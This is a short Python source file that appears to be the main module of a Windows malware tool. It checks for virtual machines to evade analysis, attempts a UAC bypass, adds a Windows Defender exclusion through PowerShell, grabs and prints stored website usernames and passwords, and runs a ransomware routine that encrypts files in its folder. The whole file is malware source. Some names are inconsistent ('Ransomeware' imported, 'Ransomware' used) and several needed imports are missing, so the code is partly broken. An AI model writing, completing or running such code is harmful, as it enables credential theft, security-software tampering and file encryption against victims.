from protections import protection_check
from uac_bypass import UACbypass,IsAdmin,GetSelf
from passwords_grabber import *
from trigger import Ransomeware

#vm-check
if protection_check(): # [pysilon_mark] !anti-vm
    os._exit(0) # [pysilon_mark] !anti-vm

if not IsAdmin():
    if GetSelf()[1]:
        if UACbypass():
            os._exit(0)

if fake_mutex_code(software_executable_name.lower()) and os.path.basename(sys.executable).lower() != software_executable_name.lower():
    os._exit(0) # [pysilon_mark] !anti-vm
#.log Executed fake mutex code check # [pysilon_mark] !anti-vm

if IsAdmin():
    exclusion_paths = [f'C:\\Users\\{getuser()}\\{software_directory_name}']
    for path in exclusion_paths:
        try:
            subprocess.run(['powershell', '-Command', f'Add-MpPreference -ExclusionPath "{path}"'], creationflags=subprocess.CREATE_NO_WINDOW)
        except: pass


#login-grabber
def logins():
    passwords = passwords_grabber.grab_passwords()
    print("Retrieved passwords:")
    for url, credential in passwords.items():
        print(f"URL: {url}, Username: {credential[0]}, Password: {credential[1]}")

# Create ransomware.
ransomware = Ransomware('SimpleRansomware')
# Encrypt files located in the same folder as our ransomware.
path = os.path.dirname(os.path.abspath(__file__))
number_encrypted_files = ransomware.encrypt_files_in_folder(path)
print('Number of encrypted files: {}'.format(number_encrypted_files))
ransomware.decrypt_files_in_folder(path)
